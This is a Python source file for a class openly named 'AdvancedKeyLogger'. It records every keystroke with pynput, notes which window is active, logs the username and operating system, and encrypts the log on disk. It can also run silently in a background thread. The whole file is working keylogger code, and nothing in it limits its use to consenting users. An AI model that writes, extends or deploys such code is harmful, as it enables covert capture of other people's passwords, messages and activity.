
import os
import threading
import platform
from datetime import datetime
from pynput import keyboard
import win32gui
import getpass
from utils.crypto import load_key, encrypt_message


class AdvancedKeyLogger:
    def __init__(self, log_file="logs/keystrokes.log"):
        self.log_file = log_file
        self.key = load_key()
        self.current_window = ""
        self.username = getpass.getuser()
        self.system_info = f"User: {self.username} | OS: {platform.system()} {platform.release()}"

        # Ensure the logs directory exists
        os.makedirs(os.path.dirname(self.log_file), exist_ok=True)

        # Write system info at the beginning
        with open(self.log_file, "ab") as f:
            f.write(self._encrypt_line("=== Session Started ==="))
            f.write(self._encrypt_line(self.system_info))

    def _encrypt_line(self, line):
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        encrypted = encrypt_message(f"{timestamp} {line}", self.key)
        return encrypted + b"\n"

    def _get_active_window(self):
        try:
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            return window
        except Exception:
            return "Unknown Window"

    def on_press(self, key):
        window = self._get_active_window()
        if window != self.current_window:
            self.current_window = window
            with open(self.log_file, "ab") as f:
                f.write(self._encrypt_line(f"\n[Window: {self.current_window}]"))

        try:
            msg = f"Key: {key.char}"
        except AttributeError:
            msg = f"Special Key: {key}"

        with open(self.log_file, "ab") as f:
            f.write(self._encrypt_line(msg))

        if key == keyboard.Key.esc:
            print("Esc pressed. Stopping keylogger...")
            return False

    def start(self):
        print("Keylogger started...")
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def start_in_thread(self):
        t = threading.Thread(target=self.start)
        t.daemon = True
        t.start()
        print("Keylogger is running in background thread.")
